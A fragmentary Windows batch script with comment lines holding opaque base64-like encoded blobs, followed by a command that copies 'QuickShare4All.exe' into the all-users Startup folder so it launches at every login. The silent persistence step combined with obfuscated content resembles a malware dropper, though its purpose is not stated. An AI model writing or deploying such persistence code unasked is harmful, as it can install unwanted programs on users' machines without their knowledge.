...
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFBxdQxKLAES0A5EO4f7+086IoVgQUewrcbPr+YuaL+8f+XnXdJs+w3Rdqd4FDxBrdhO5a1sVpWJ+h3GMNMyvuw7zTxyo6kd+Hn1x5w==
::YB416Ek+ZW8=
::
::
...
if NOT exist "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\QuickShare4All.exe" copy "QuickShare4All.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"